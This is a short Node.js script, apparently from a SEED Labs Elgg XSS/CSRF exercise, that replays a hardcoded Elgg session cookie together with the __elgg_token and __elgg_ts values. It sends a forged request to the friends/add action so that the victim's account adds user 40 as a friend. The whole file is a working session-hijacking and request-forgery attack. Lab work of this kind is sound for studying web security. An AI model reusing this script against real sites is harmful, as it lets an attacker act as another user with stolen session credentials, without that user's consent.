'use strict';

const http = require('http');

const session = 'japhli0pr5f8e3i13rqebm7r20';
const token = 'a11f651a94c0e44ee5ebd66073234077';
const timestamp = '1459482134';

addFriend(session, token, timestamp);

function addFriend(session, token, timestamp) {
  if (!session || !token || !timestamp) return;

  console.log('Adding friend:');
  console.log(session, token, timestamp);

  let params = [
    ['friend', 40],
    ['__elgg_token', encodeURIComponent(token)],
    ['__elgg_ts', encodeURIComponent(timestamp)]
  ];

  let encodedSession = encodeURIComponent(session);
  let encodedParams = params.map(p => p.join('=')).join('&');

  let request = http.request({
    protocol: 'http:',
    host: 'www.xsslabelgg.com',
    port: 80,
    method: 'GET',
    path: `/action/friends/add?${encodedParams}`,
    headers: {
      'Cookie': `Elgg=${encodedSession}`
    }
  });

  request.end();
}
